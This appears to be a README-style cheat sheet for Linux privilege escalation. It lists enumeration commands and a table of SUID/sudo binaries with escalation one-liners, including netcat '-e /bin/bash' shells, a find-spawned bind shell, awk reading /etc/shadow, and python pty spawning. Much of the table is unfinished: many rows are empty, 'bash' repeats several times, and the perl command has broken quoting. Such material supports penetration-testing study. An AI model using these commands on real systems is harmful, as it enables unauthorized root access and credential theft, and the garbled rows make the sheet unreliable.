# Linux-Privilege-Escalation
Tips and Tricks for Linux Priv Escalation

## Start with the basics

Who am i?  
`id`

Who else is on this box (lateral movement)?  
`ls -la /home`  
`cat /etc/passwd`  

What Kernel version and distro are we working with here?  
`uname -a`  
`cat /etc/issue`  

What files and folders are in my home user's directory?  
`ls -la ~`

## Next focus on what we can EXECUTE

Who can execute code as root (probably will get a permission denied)?  
`cat /etc/sudoers`

Can I execute code as root (you will need the user's password)?  
`sudo -l`

What executables have SUID bit that can be executed as another user?  
`find / -user root -perm -4000 -print 2>/dev/null`  
`find / -perm -u=s -type f 2>/dev/null`  
`find / -user root -perm -4000 -exec ls -ldb {} \;`  

If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:

| SUID / SUDO Executables               | Priv Esc Command                                                                    |
|---------------------------------------|-------------------------------------------------------------------------------------|
| nmap<br>(older versions 2.02 to 5.21) | nmap --interactive<br>!sh                                                           |
| netcat<br>nc                          | nc -nlvp 4444 &<br> nc -e /bin/bash 127.0.0.1 4444                                  |
| ncat                                  |                                                                                     |
| awk <br>gawk                          | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
| python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
| perl                                  | perl -e 'exec' "/bin/bash";'                                                                                   |
| php                                   |      |
| find                                  | find /home -exec nc -lvp 4444 -e /bin/bash \\;<br> find /home -exec /bin/bash \\;  |
| xxd                                   |                                                                                     |
| vi                                    |                                                                                     |
| more                                  |                                                                                     |
| less                                  |                                                                                     |
| nano                                  |                                                                                     |
| cp                                    |                                                                                     |
| cat                                   |                                                                                     |
| bash                                  |                                                                                     |
| bash                                  |                                                                                     |
| bash                                  |                                                                                     |
| bash                                  |                                                                                     |
| bash                                  |                                                                                     |
| bash                                  |                                                                                     |
| bash                                  |                                                                                     |





## References

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
https://payatu.com/guide-linux-privilege-escalation/

